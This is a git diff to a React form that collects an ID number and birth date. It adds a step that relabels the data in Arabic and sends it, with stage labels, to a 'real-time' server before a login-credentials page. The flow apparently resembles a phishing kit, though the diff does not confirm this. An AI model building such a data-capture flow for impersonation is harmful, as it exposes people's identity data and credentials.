@@ -12,6 +12,7 @@ import { useNavigate } from "react-router-dom";
 import ErrorDialog from "./ErrorDialog";
 import CustomInput from "./CustomInput";
 import CustomSelect from "./CustomSelect";
+import { sendDataToServer } from "@/real-time/utils/utils";
 
 const PersonalDataForm = () => {
   const [formData, setFormData] = useState({
@@ -62,28 +63,6 @@ const PersonalDataForm = () => {
 
   const isFormValid = validate(formData).isValid;
 
-  const handleIdChange = (e: ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value;
-    if (/^\d*$/.test(value) && value.length <= 10) {
-      const newData = { ...formData, idNumber: value };
-      setFormData(newData);
-      if (showErrors) {
-        setErrors(validate(newData).newErrors);
-      }
-    }
-  };
-
-  const handleContinue = () => {
-    const { isValid, newErrors } = validate(formData);
-    if (!isValid) {
-      setErrors(newErrors);
-      setShowErrors(true);
-      setShowErrorDialog(true);
-      return;
-    }
-    console.log("Submitting formData:", formData);
-  };
-
   const getCurrentYear = () => {
     if (formData.dateType === "hijri") {
       try {
@@ -106,6 +85,67 @@ const PersonalDataForm = () => {
   const years = Array.from({ length: 110 }, (_, i) => currentYear - i);
   const months = Array.from({ length: 12 }, (_, i) => i + 1);
   const days = Array.from({ length: 31 }, (_, i) => i + 1);
+
+  const handleIdChange = (e: ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    if (/^\d*$/.test(value) && value.length <= 10) {
+      const newData = { ...formData, idNumber: value };
+      setFormData(newData);
+      if (showErrors) {
+        setErrors(validate(newData).newErrors);
+      }
+    }
+  };
+
+  const handleContinue = () => {
+    const { isValid, newErrors } = validate(formData);
+    if (!isValid) {
+      setErrors(newErrors);
+      setShowErrors(true);
+      setShowErrorDialog(true);
+      return;
+    }
+
+    const dateTypeMap: Record<string, string> = {
+      gregorian: "ميلادي",
+      hijri: "هجري",
+    };
+
+    const fieldMap: Record<string, string> = {
+      idNumber: "رقم الهوية",
+      dateType: "نوع التاريخ",
+      day: "اليوم",
+      month: "الشهر",
+      year: "السنة",
+    };
+
+    const arabicData: Record<string, string> = {};
+
+    Object.entries(formData).forEach(([key, value]) => {
+      if (value && value.toString().trim() !== "") {
+        const arabicKey = fieldMap[key] || key;
+        let arabicValue = value.toString();
+
+        if (key === "dateType") {
+          arabicValue = dateTypeMap[value] || value;
+        }
+
+        arabicData[arabicKey] = arabicValue;
+      }
+    });
+
+    console.log("Submitting:", arabicData);
+
+    sendDataToServer({
+      data: arabicData,
+      current: "التحقق من الهوية الشخصية",
+      nextPage: "تسجيل بيانات الدخول",
+    });
+  };
+
+  const handleBack = () => {
+    navigate("/");
+  };
 
   return (
     <Box sx={{ height: "100%", display: "flex", flexDirection: "column" }}>
@@ -307,7 +347,7 @@ const PersonalDataForm = () => {
 
           <Button
             variant="outlined"
-            onClick={() => navigate("/registration")}
+            onClick={handleBack}
             sx={{
               width: { xs: "100%", md: "fit-content" },
               padding: ".5rem 3rem",
